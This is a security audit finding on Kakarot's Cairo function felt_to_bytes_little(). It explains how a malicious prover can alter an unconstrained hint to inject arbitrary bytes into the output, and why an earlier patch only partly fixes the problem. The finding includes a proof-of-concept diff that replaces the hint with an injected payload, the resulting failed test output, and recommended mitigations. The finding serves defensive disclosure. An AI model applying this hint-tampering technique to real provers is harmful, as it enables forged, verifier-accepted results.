## [L-01] felt_to_bytes_little() underconstrained leading to appending of arbitrary values to the result

*Affected code*: [link](https://github.com/kkrt-labs/kakarot/blob/038b3a3fa66cd1b8959665fed3e2eb7934e146b1/src/utils/bytes.cairo#L46-L138)

`felt_to_bytes_little()` uses a hint to get the last 8 digits of a felt to store as a byte. The hint might be arbitrarily changed by a malicious prover, assigning the byte value as they see fit (within bounds). This can be repeated indefinitely as there are no length checks for the resulting array inside the function, allowing the prover to insert arbitrary payloads at the start of the returned array (or at its end in big-endian variants of the function that call `felt_to_bytes_little()` as a subroutine).

A limitation on exploits taking advantage of this vulnerability is the [loop exit condition](https://github.com/kkrt-labs/kakarot/blob/038b3a3fa66cd1b8959665fed3e2eb7934e146b1/src/utils/bytes.cairo#L80), as just inserting arbitrary values different from the expected ones without any "padding" values will almost never result in `value` becoming 0 (an example of this is shown in the PoC). The reason for this is that for every loop iteration, if the value of `byte` differs from `value`, a following [recomputation of `value`](https://github.com/kkrt-labs/kakarot/blob/038b3a3fa66cd1b8959665fed3e2eb7934e146b1/src/utils/bytes.cairo#L74) for the next iteration will result in it containing a big felt, the result of field division. Therefore an attacker has to insert a "pad" of subsequent `value % 256` bytes to make the function terminate. However, it is worth noting that the length of this pad is limited to 32 (`value` is obviously always bound by `PRIME` even after the prover's tampering).

This issue is only partially mitigated by the changes introduced in [PR#1317](https://github.com/kkrt-labs/kakarot/pull/1317). The patch on `bytes.cairo` introduces a check that asserts whether the generated `byte_length` is the smallest possible for a given value. `byte_length`, however, is not constrained, making dereferences like [these](https://github.com/kkrt-labs/kakarot/blob/038b3a3fa66cd1b8959665fed3e2eb7934e146b1/src/utils/bytes.cairo#L98) take values from the bytecode. That means an attacker might manipulate `lower_bound` and `upper_bound` to make the introduced check pass for their payload, with trial and error or some other heuristic. It is worthy of note that different (and somewhat unpredictable) pad lengths are required depending on the original value and the length of the payload.

## Proof of Concept
Test run:
```diff
diff --git a/tests/src/utils/test_bytes.py b/tests/src/utils/test_bytes.py
index 32b8f86..3f683c8 100644
--- a/tests/src/utils/test_bytes.py
+++ b/tests/src/utils/test_bytes.py
@@ -74,8 +74,8 @@ class TestBytes:
             ):
                 cairo_run("test__felt_to_bytes_little", n=n)
 
-    class TestFeltToBytes:
-        @given(n=integers(min_value=0, max_value=2**248 - 1))
+    class TestFeltToBytes_POC:
+        @given(n=integers(min_value=0xFFFFFFFF, max_value=0xFFFFFFFF))
         def test_should_return_bytes(self, cairo_run, n):
             output = cairo_run("test__felt_to_bytes", n=n)
             res = bytes(output)
```

Codebase changes:
```diff
diff --git a/src/utils/bytes.cairo b/src/utils/bytes.cairo
index 87d1b2a..66751da 100644
--- a/src/utils/bytes.cairo
+++ b/src/utils/bytes.cairo
@@ -64,7 +64,34 @@ func felt_to_bytes_little{range_check_ptr}(dst: felt*, value: felt) -> felt {
     let bound = base;
 
     %{
-        memory[ids.output] = res = (int(ids.value) % PRIME) % ids.base
+        if ids.bytes_len == 0:
+            memory[ids.output] = res = 0x21
+        elif ids.bytes_len == 1:
+            memory[ids.output] = res = 0x65
+        elif ids.bytes_len == 2:
+            memory[ids.output] = res = 0x66
+        elif ids.bytes_len == 3:
+            memory[ids.output] = res = 0x61
+        elif ids.bytes_len == 4:
+            memory[ids.output] = res = 0x73
+        elif ids.bytes_len == 5:
+            memory[ids.output] = res = 0x6e
+        elif ids.bytes_len == 6:
+            memory[ids.output] = res = 0x75
+        elif ids.bytes_len == 7:
+            memory[ids.output] = res = 0x20
+        elif ids.bytes_len == 8:
+            memory[ids.output] = res = 0x65
+        elif ids.bytes_len == 9:
+            memory[ids.output] = res = 0x64
+        elif ids.bytes_len == 10:
+            memory[ids.output] = res = 0x6f
+        elif ids.bytes_len == 11:
+            memory[ids.output] = res = 0x63
+        elif ids.bytes_len < 22:
+            memory[ids.output] = res = 0x20
+        else:
+            memory[ids.output] = res = ids.value % ids.base
         assert res < ids.bound, f'split_int(): Limb {res} is out of range.'
     %}
     let byte = [output];
```

Result:
```
___________________ TestBytes.TestFeltToBytes_POC.test_should_return_bytes ___________________

self = <test_bytes.TestBytes.TestFeltToBytes_POC object at 0xffff178a7640>
cairo_run = <function cairo_run.<locals>._factory at 0xffff17b30790>

    @given(n=integers(min_value=0xFFFFFFFF, max_value=0xFFFFFFFF))
>   def test_should_return_bytes(self, cairo_run, n):

tests/src/utils/test_bytes.py:79:
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <test_bytes.TestBytes.TestFeltToBytes_POC object at 0xffff178a7640>
cairo_run = <function cairo_run.<locals>._factory at 0xffff17b30790>, n = 4294967295

    @given(n=integers(min_value=0xFFFFFFFF, max_value=0xFFFFFFFF))
    def test_should_return_bytes(self, cairo_run, n):
        output = cairo_run("test__felt_to_bytes", n=n)
        res = bytes(output)
>       assert bytes.fromhex(f"{n:x}".rjust(len(res) * 2, "0")) == res
E       AssertionError: assert b'\x00\x00 (...) \x00\xff\xff\xff\xff' ==
b'\x01\x01\x01\x01\x01\x01\x01\x03##%=\x9dEK%\xcd\x9a-p\xdd\xe07\xccU\x98w\xcc\xb7B\x00\x00          code unsafe!'
E
E         At index 0 diff: b'\x00' != b'\x01'
E
E         Full diff:
E         - (b'\x01\x01\x01\x01\x01\x01\x01\x03##%=\x9dEK%\xcd\x9a-p\xdd\xe07\xccU\x98w\xcc'
E         -  b'\xb7B\x00\x00          code unsafe!')
E         + (b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
E         +  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
E         +  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
E         +  b'\x00\x00\xff\xff\xff\xff')
E       Falsifying example: test_should_return_bytes(
E           self=<test_bytes.TestBytes.TestFeltToBytes_POC object at 0xffff178a7640>,
E           cairo_run=_factory,
E           n=4294967295,
E       )

tests/src/utils/test_bytes.py:82: AssertionError
============================== 1 failed, 41 deselected in 1.12s ==============================
```

This would be valid in a production environment as there are no verifier errors.

## Recommended Mitigation Steps
Place constraints on `byte_len` at the end of the function and/or check whether the value of `value` in a given iteration is strictly smaller than in the previous one.
